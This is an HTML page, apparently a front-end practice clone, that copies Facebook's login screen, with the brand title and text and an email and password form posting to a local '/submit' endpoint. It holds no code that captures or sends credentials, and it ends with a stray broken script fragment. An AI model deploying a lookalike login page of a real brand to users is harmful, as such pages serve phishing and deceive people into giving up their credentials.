<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>

    <link rel="stylesheet" href="index.css">
    <link rel="shortcut icon" href="images/favicon-32x32.png" type="image/x-icon">

    <!-- BOOTSTRAP  LINK -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" 
    rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" 
    crossorigin="anonymous">
</head>

<body>
    <div class="main container-fluid text-center">
        <div class="row ">
            <div class="col-lg-6 text-lg-start text-ms-center mb-4 d-flex align-items-center justify-content-center">
                <div class="ms-xl-5 ps-xl-5">
                    <h1 class="fb-title fw-bold text-primary ms-xl-5 ps-xl-5">facebook</h1>
                    <h4 class="fb-text fw-normal m-0 ms-xl-5 ps-xl-5">Connect with friends and the world </h4>
                    <h4 class="fb-text fw-normal ms-xl-5 ps-xl-5">around you on Facebook.</h4>
                </div>
            </div>
            
            <div class="col-lg-6 d-flex justify-content-center mt-lg-5">
                <div class="mt-lg-5 me-xl-5 pe-xl-5">
                    <div class="card mt-lg-5 me-xl-5" style="width: 400px; height: 350px;">
                        <div class="card-body">

                            <form action="/submit" method="post" class="form">
                        

                                <div class="mb-2"><input type="text" id="email" 
                                placeholder="Email or phone number"  required></div>
                        

                                <div class="mb-3"><input type="password" id="password" 
                                placeholder="Password" required></div>
                    
                                <button type="submit" class="btn fw-bold fs-5 btn-primary">Log In</button>
                                
                            </form>

                            <p class="text-primary mt-3">Forgot password?</p>
                            <hr class="mb-4">
                            <button class="new-acc">Creat new account</button>


                        </div>
                    </div>
                    <p class="mt-4 pe-xl- me-xl-5"><strong>Create a Page</strong> for a celebrity, brand or business.</p>   
                </div>            
            </div>
            
        </div>
    </div>
</body>

crossorigin="anonymous"></script>

</html>
